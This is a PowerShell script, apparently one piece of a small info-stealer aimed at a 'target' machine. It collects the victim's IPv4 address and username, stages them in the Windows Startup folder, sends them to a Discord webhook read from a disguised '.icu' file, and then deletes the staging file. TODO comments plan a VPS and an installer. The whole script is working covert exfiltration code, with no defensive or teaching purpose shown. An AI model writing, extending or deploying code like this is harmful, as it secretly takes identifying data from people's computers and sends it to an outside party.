# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
# Get IPv4 address of the machine
$ipAddressString = "IPv4 Address"
# Uncomment the following line when using older versions of Windows without IPv6 support
# $ipAddressString = "IP Address"
$ipconfigOutput = ipconfig
$IPAddress = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1

# Get the current user's username
$Username = $env:USERNAME

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "$IPAddress`n$Username"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.txt"
$TextContent | Out-File -FilePath $TextFile

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Body @{
    content = $TextContent
}

# Delete the text file
Remove-Item -Path $TextFile